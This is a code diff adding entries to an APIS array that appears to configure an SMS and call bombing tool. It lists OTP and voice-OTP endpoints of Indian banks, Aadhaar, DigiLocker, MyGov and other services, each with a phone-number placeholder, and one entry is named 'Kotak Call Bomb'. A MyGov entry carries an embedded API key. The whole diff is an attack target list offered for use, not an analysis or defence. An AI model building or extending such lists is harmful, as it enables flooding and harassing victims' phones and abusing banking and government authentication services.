@@ -1,4 +1,77 @@
 const APIS = [
+  {
+        "name": "Aadhaar SMS",
+        "url": "https://resident.uidai.gov.in/api/v1/auth/send-otp",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "Yono SBI Call",
+        "url": "https://yonosbi.sbi.co.in/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+
+  {
+        "name": "ICICI iMobile Voice",
+        "url": "https://www.icicibank.com/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+{
+        "name": "HDFC NetBanking Call",
+        "url": "https://netbanking.hdfcbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+{
+        "name": "Axis Mobile Voice",
+        "url": "https://www.axisbank.com/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+{
+        "name": "Kotak Call Bomb",
+        "url": "https://www.kotak.com/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+{
+        "name": "Yes Bank Voice OTP",
+        "url": "https://www.yesbank.in/api/v1/voice-otp",
+        "method": "POST",
+        "category": "call",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202, 203, 204, 205, 206]
+    },
+  {
+        "name": "DigiLocker SMS",
+        "url": "https://api.digilocker.gov.in/api/v1/auth/send-otp",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
   
   {
         "name": "Instagram SMS",
@@ -114,6 +187,24 @@ const APIS = [
         "category": "call",
         "headers": {"Content-Type": "application/json"},
         "body": {"mobile": "{phone}"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "PayMe India SMS",
+        "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
+        "method": "POST",
+        "category": "sms",
+        "headers": {"Content-Type": "application/json"},
+        "body": {"phone": "{phone}", "app_signature": "S10ePIIrbH3"},
+        "success_codes": [200, 201, 202]
+    },
+  {
+        "name": "MyGov SMS",
+        "url": "https://auth.mygov.in/regapi/register_api_ver1/",
+        "method": "GET",
+        "category": "sms",
+        "headers": {},
+        "params": {"api_key": "57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b", "name": "raj", "email": "", "gateway": "91", "mobile": "{phone}", "gender": "male"},
         "success_codes": [200, 201, 202]
     },
   
